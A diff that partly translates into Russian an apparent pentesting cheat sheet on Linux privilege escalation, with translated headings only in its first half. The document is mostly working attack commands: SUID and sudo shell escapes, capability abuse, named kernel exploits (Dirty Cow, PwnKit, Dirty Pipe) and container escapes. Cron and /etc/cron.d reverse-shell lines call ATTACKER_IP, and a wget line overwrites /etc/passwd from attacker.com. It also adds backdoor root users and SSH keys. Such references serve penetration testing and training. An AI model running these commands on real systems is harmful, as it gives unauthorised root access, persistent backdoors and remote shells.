@@ -1,202 +1,184 @@
-#  Sudo, SUID, Capabilities
+# Sudo, SUID, возможности (capabilities)
 
-Linux privilege escalation commands for sudo, SUID, capabilities, cron, containers and restricted shells, plus local console password recovery.
+Команды повышения привилегий в Linux для sudo, SUID, capabilities, cron, контейнеров и ограниченных оболочек, а также восстановление паролей локальной консоли.
 
-**What is Linux Privilege Escalation?**
+**Что такое повышение привилегий в Linux?**
 
-Linux privilege escalation crosses a user or service boundary through misconfiguration or a vulnerable component. Useful leads include privileged executables, writable files consumed by privileged jobs and delegated command rights. Verify ownership, execution context and actual write access before treating a discovery as an escalation path.
+Повышение привилегий в Linux означает пересечение границы пользователя или службы за счёт ошибки конфигурации либо уязвимого компонента. Полезные зацепки: привилегированные исполняемые файлы, файлы, доступные на запись и используемые привилегированными задачами, и делегированные права на выполнение команд. Прежде чем считать находку путём повышения привилегий, проверьте владельца, контекст выполнения и фактический доступ на запись.
 
-Enumeration output must be interpreted with the effective UID, groups and namespace context. Kernel version strings alone do not establish exploitability.
+Результаты перечисления нужно интерпретировать с учётом действующего UID, групп и контекста пространства имён. Одна лишь строка версии ядра не доказывает наличие возможности эксплуатации.
 
-Basic identity and kernel info
+Базовая информация об учётной записи и ядре.
 
 ```
 id && whoami && hostname && uname -a
 ```
 
-List login-capable users
+Список пользователей, имеющих возможность входа в систему.
 
 ```
 cat /etc/passwd | grep -v nologin | grep -v false
 ```
 
-List sudo privileges for current user — key privesc starting point
+Список привилегий sudo для текущего пользователя — ключевая отправная точка для повышения привилегий.
 
 ```
 sudo -l
 ```
 
-List all cron jobs
+Список всех заданий cron.
 
 ```
 cat /etc/crontab && ls -la /etc/cron.*
 ```
 
-Find all SUID binaries
+Поиск всех бинарников с установленным битом SUID.
 
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-Find all SGID binaries
+Поиск всех бинарников с установленным битом SGID.
 
 ```
 find / -perm -g=s -type f 2>/dev/null
 ```
 
-Find binaries with Linux capabilities set
+Поиск бинарников с установленными возможностями (capabilities) Linux.
 
 ```
 getcap -r / 2>/dev/null
 ```
 
-Find world-writable files
+Поиск файлов, доступных на запись всем пользователям (world-writable).
 
 ```
 find / -writable -type f 2>/dev/null | grep -v proc
 ```
 
-Check environment variables and shell history
+Проверка переменных окружения и истории оболочки.
 
 ```
 env && cat ~/.bash_history && cat ~/.bashrc
 ```
 
-Kernel version for exploit research
+Версия ядра для поиска подходящих эксплойтов.
 
 ```
 cat /proc/version && cat /etc/issue && uname -r
 ```
 
-Running processes owned by root
+Запущенные процессы, принадлежащие root.
 
 ```
 ps aux | grep root
 ```
 
-Listening ports — internal services not exposed externally
+Прослушиваемые порты — внутренние службы, не доступные извне.
 
 ```
 ss -tlnp && netstat -tlnp 2>/dev/null
 ```
 
-Search readable config files for passwords
+Поиск паролей в доступных на чтение конфигурационных файлах.
 
 ```
 find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
 ```
 
-Search a directory recursively for password references
+Рекурсивный поиск упоминаний паролей в каталоге.
 
 ```
 grep -Rni "password" /var/www 2>/dev/null
 ```
 
-Read sudoers file if accessible
+Чтение файла sudoers, если он доступен.
 
 ```
 cat /etc/sudoers 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
 ```
 
-Check home directory dotfiles for credentials
+Проверка скрытых файлов (dotfiles) в домашнем каталоге на наличие учётных данных.
 
 ```
 ls -la /home/*/.*
 ```
 
-Find SSH private keys
+Поиск закрытых ключей SSH.
 ```
 find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null
 ```
 
-find SUID — execute shell with SUID permissions
+Поиск SUID — выполнение оболочки с привилегиями SUID.
 
 ```
 /usr/bin/find . -exec /bin/sh -p \;
 ```
 
-vim SUID — spawn shell from within vim
+vim с SUID — запуск оболочки изнутри vim.
 
 ```
 vim -c ":!/bin/sh"
 ```
 
-python SUID — exec shell preserving SUID
+python с SUID — выполнение оболочки с сохранением SUID.
 
 ```
 python3 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
 ```
 
-perl SUID — exec shell
-
-AskCopy
+perl с SUID — выполнение оболочки.
 
 ```
 perl -e 'exec "/bin/sh";'
 ```
 
-ruby SUID — exec shell
-
-AskCopy
+ruby с SUID — выполнение оболочки.
 
 ```
 ruby -e 'exec "/bin/sh"'
 ```
 
-awk SUID — system call to shell
-
-AskCopy
+awk с SUID — вызов системной команды для запуска оболочки.
 
 ```
 awk 'BEGIN {system("/bin/sh")}'
 ```
 
-less SUID — escape to shell via ! command
-
-AskCopy
+less с SUID — выход в оболочку через команду `!`.
 
 ```
 less /etc/passwd
 !/bin/sh
 ```
 
-nmap (old versions) SUID interactive mode shell escape
-
-AskCopy
+`nmap` (старые версии) с SUID — выход в оболочку через интерактивный режим.
 
 ```
 nmap --interactive
 nmap> !sh
 ```
 
-bash SUID — -p flag preserves effective UID
-
-AskCopy
+`bash` с SUID — флаг `-p` сохраняет действующий UID.
 
 ```
 bash -p
 ```
 
-cp SUID — copy bash with SUID bit, then execute it
-
-AskCopy
+`cp` с SUID — копирование bash с установкой бита SUID и последующим его запуском.
 
 ```
 cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
 /tmp/rootbash -p
 ```
 
-tar SUID — checkpoint action to execute shell
-
-AskCopy
+`tar` с SUID — выполнение оболочки через checkpoint-действие.
 
 ```
 tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-node SUID — spawn shell
-
-AskCopy
+`node` с SUID — запуск оболочки.
 
 ```
 node -e "require('child_process').spawn('/bin/sh', {
@@ -204,34 +186,26 @@ node -e "require('child_process').spawn('/bin/sh', {
 })"
 ```
 
-env SUID — preserve effective UID
-
-AskCopy
+`env` с SUID — сохранение действующего UID.
 
 ```
 env /bin/sh -p
 ```
 
-strace SUID — run shell under strace, preserving SUID
-
-AskCopy
+`strace` с SUID — запуск оболочки под strace с сохранением SUID.
 
 ```
 strace -o /dev/null /bin/sh -p
 ```
 
-tclsh SUID — exec shell with I/O redirection
-
-AskCopy
+`tclsh` с SUID — выполнение оболочки с перенаправлением ввода-вывода.
 
 ```
 tclsh
 exec /bin/sh <@stdin >@stdout 2>@stderr
 ```
 
-NOPASSWD vim — open shell from vim command mode
-
-AskCopy
+NOPASSWD для vim — открытие оболочки из командного режима vim.
 
 ```
 # sudo -l output → (root) NOPASSWD: /bin/vim
@@ -240,8 +214,6 @@ sudo vim -c ":!/bin/bash"
 
 NOPASSWD find — execute shell via -exec
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/find
 sudo find . -exec /bin/sh \; -quit
@@ -249,16 +221,12 @@ sudo find . -exec /bin/sh \; -quit
 
 NOPASSWD python3 — system call to bash
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/python3
 sudo python3 -c "import os; os.system('/bin/bash')"
 ```
 
 NOPASSWD less — shell escape via ! in less pager
-
-AskCopy
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/less
@@ -268,8 +236,6 @@ sudo less /etc/passwd
 
 Sudo -u#-1 bypass (CVE-2019-14287) — sudo &lt; 1.8.28
 
-AskCopy
-
 ```
 # sudo -l → (ALL, !root) /bin/bash
 # CVE-2019-14287: sudo < 1.8.28 bypass
@@ -277,8 +243,6 @@ sudo -u#-1 /bin/bash
 ```
 
 LD_PRELOAD abuse — requires env_keep in sudoers
-
-AskCopy
 
 ```
 # LD_PRELOAD trick (requires env_keep += LD_PRELOAD in sudoers)
@@ -297,8 +261,6 @@ sudo LD_PRELOAD=/tmp/evil.so <allowed_command>
 
 NOPASSWD wget — overwrite /etc/passwd
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/wget
 sudo wget http://attacker.com/passwd -O /etc/passwd
@@ -306,16 +268,12 @@ sudo wget http://attacker.com/passwd -O /etc/passwd
 
 NOPASSWD tee — append new root user to /etc/passwd
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/tee
 echo "root2:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
 ```
 
 Script path hijacking — inject into sourced file
-
-AskCopy
 
 ```
 # sudo -l → (root) /bin/bash /path/to/script.sh
@@ -325,8 +283,6 @@ echo "bash -i" > /writable/path/sourced.sh
 
 NOPASSWD git — pager escape to shell
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/git
 sudo git -p help config
@@ -334,8 +290,6 @@ sudo git -p help config
 ```
 
 NOPASSWD zip — unzip-command shell escape
-
-AskCopy
 
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/zip
@@ -345,16 +299,12 @@ sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
 
 NOPASSWD apt-get — Pre-Invoke hook to shell
 
-AskCopy
-
 ```
 # sudo -l → (root) NOPASSWD: /usr/bin/apt-get
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
 ```
 
 Enumerate all cron jobs — look for writable scripts
-
-AskCopy
 
 ```
 cat /etc/crontab
@@ -365,16 +315,12 @@ cat /var/spool/cron/crontabs/*
 
 Append reverse shell to world-writable cron script
 
-AskCopy
-
 ```
 # If cron runs /opt/cleanup.sh as root and file is world-writable:
 echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /opt/cleanup.sh
 ```
 
 PATH hijacking — cron uses relative command name
-
-AskCopy
 
 ```
 # If cron uses relative PATH and /tmp is writable:
@@ -386,8 +332,6 @@ chmod +x /tmp/backup.sh
 ```
 
 tar wildcard injection via checkpoint flags
-
-AskCopy
 
 ```
 # Wildcard injection in cron tar command:
@@ -401,16 +345,12 @@ chmod +x revshell.sh
 
 Write new root cron job if cron.d is writable
 
-AskCopy
-
 ```
 # Writable cron.d directory:
 echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /etc/cron.d/backdoor
 ```
 
 Add new root user to writable /etc/passwd
-
-AskCopy
 
 ```
 # /etc/passwd writable → add new root user
@@ -420,8 +360,6 @@ su hacker  # password: hacked
 
 Replace root hash in writable /etc/shadow
 
-AskCopy
-
 ```
 # /etc/shadow writable → replace root password hash
 python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
@@ -429,8 +367,6 @@ python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHO
 ```
 
 Add NOPASSWD ALL to writable sudoers
-
-AskCopy
 
 ```
 # /etc/sudoers writable → add NOPASSWD rule
@@ -440,16 +376,12 @@ sudo bash
 
 Find root-owned world-writable files
 
-AskCopy
-
 ```
 # Find files owned by root but writable by current user:
 find / -user root -writable -type f 2>/dev/null | grep -v proc
 ```
 
 Append SSH public key to root authorized_keys
-
-AskCopy
 
 ```
 # Append SSH key to root authorized_keys (if ~/.ssh writable):
@@ -459,8 +391,6 @@ chmod 600 /root/.ssh/authorized_keys
 ```
 
 Enumerate and understand dangerous capabilities
-
-AskCopy
 
 ```
 # Find capabilities:
@@ -475,16 +405,12 @@ getcap -r / 2>/dev/null
 
 python3 cap_setuid — set UID to 0 and spawn bash
 
-AskCopy
-
 ```
 # python3 with cap_setuid+ep:
 python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
 ```
 
 perl cap_setuid — escalate to root
-
-AskCopy
 
 ```
 # perl with cap_setuid+ep:
@@ -493,16 +419,12 @@ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 
 vim cap_setuid — use Python to setuid and spawn shell
 
-AskCopy
-
 ```
 # vim with cap_setuid+ep:
 vim -c ":py3 import os; os.setuid(0); os.execl('/bin/bash', 'bash', '-p')"
 ```
 
 node cap_setuid — set UID to 0 and spawn shell
-
-AskCopy
 
 ```
 # node with cap_setuid+ep:
@@ -511,25 +433,18 @@ node -e "process.setuid(0); require('child_process').spawn('/bin/bash', {stdio: 
 
 tar cap_dac_read_search — read /etc/shadow
 
-AskCopy
-
 ```
 # tar with cap_dac_read_search — read any file:
 tar xf /etc/shadow -I cat
 ```
 
 openssl cap_setuid — load malicious engine to escalate
-
-AskCopy
-
 ```
 # openssl with cap_setuid:
 openssl req -engine /tmp/evil.so
 ```
 
 Dirty Cow CVE-2016-5195 — overwrite /etc/passwd via PTRACE_POKETEXT
-
-AskCopy
 
 ```
 # Dirty Cow (CVE-2016-5195) — kernel < 4.8.3
@@ -542,8 +457,6 @@ gcc -pthread dirty.c -o dirty -lcrypt
 
 Dirty Pipe CVE-2022-0847 — overwrite SUID binaries to add shell backdoor
 
-AskCopy
-
 ```
 # Dirty Pipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
 # Overwrite read-only files
@@ -552,8 +465,6 @@ AskCopy
 ```
 
 PwnKit CVE-2021-4034 — pkexec out-of-bounds write → root
-
-AskCopy
 
 ```
 # PwnKit (CVE-2021-4034) — pkexec privilege escalation
@@ -564,8 +475,6 @@ AskCopy
 
 overlayfs CVE-2023-0386 — FUSE + overlayfs SUID file bypass
 
-AskCopy
-
 ```
 # overlayfs (CVE-2023-0386) — kernel < 6.2
 # Unprivileged user namespace + overlayfs to escalate
@@ -574,8 +483,6 @@ AskCopy
 ```
 
 linux-exploit-suggester.sh — match kernel version to known exploits
-
-AskCopy
 
 ```
 # Automated kernel exploit suggester:
@@ -587,8 +494,6 @@ bash les.sh --kernelmode --uname "$(uname -r)"
 ```
 
 Detect Docker container and check if privileged
-
-AskCopy
 
 ```
 # Check if inside Docker:
@@ -602,8 +507,6 @@ cat /proc/self/status | grep -i cap
 
 Privileged container: mount host drive and chroot
 
-AskCopy
-
 ```
 # Privileged container — mount host filesystem:
 mkdir /mnt/host
@@ -613,9 +516,6 @@ chroot /mnt/host bash
 ```
 
 docker.sock escape — launch new privileged container with host root mount
-
-AskCopy
-
 ```
 # Docker socket escape (if /var/run/docker.sock is accessible):
 ls -la /var/run/docker.sock
@@ -625,9 +525,6 @@ docker run -v /:/host --rm -it ubuntu chroot /host bash
 ```
 
 cgroups v1 notify_on_release RCE as host root
-
-AskCopy
-
 ```
 # cgroups v1 notify_on_release escape (CVE-2022-0492 style):
 d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
@@ -639,9 +536,6 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1; cat /o
 ```
 
 K8s service account token — enumerate cluster secrets
-
-AskCopy
-
 ```
 # Kubernetes: extract service account token:
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
@@ -656,23 +550,17 @@ A remote command may bypass an interactive restricted-shell startup only when SS
 
 Discover commands available in the restricted Bash environment
 
-AskCopy
-
 ```
 compgen -c
 ```
 
 Request Bash without its interactive startup files
 
-AskCopy
-
 ```
 ssh -t USER@HOST 'bash --noprofile --norc'
 ```
 
 Restore a usable PATH after leaving the restricted shell
-
-AskCopy
 
 ```
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@@ -684,15 +572,11 @@ Requires console access, permission to edit the GRUB boot entry, and an accessib
 
 Kernel parameters in the GRUB entry, not a shell command
 
-AskCopy
-
 ```
 rw init=/bin/bash
 ```
 
 Reset a local account from the recovery root shell
-
-AskCopy
 
 ```
 mount -o remount,rw /
@@ -703,17 +587,3 @@ mount -o remount,ro /
 ```
 
 Boot normally afterward; the edited entry is temporary. Initramfs, separate filesystems, or SELinux can require the distribution's recovery procedure. Sources: [GRUB editing](https://www.gnu.org/software/grub/manual/grub/grub.html), [Linux kernel parameters](https://docs.kernel.org/admin-guide/kernel-parameters.html).
-
-[
-
-PreviousKerberos Attacks
-
-](https://hacking-notes.jord4n.pro/cheat-sheets/systems-active-directory/kerberos-attacks)[
-
-NextWindows Privilege Escalation
-
-](https://hacking-notes.jord4n.pro/cheat-sheets/systems-active-directory/windows-privilege-escalation)
-
-Last updated 9 days ago
-
-Linux Privilege Escalation Cheat Sheet: Sudo, SUID, Capabilities | Hacking Notes Jordan
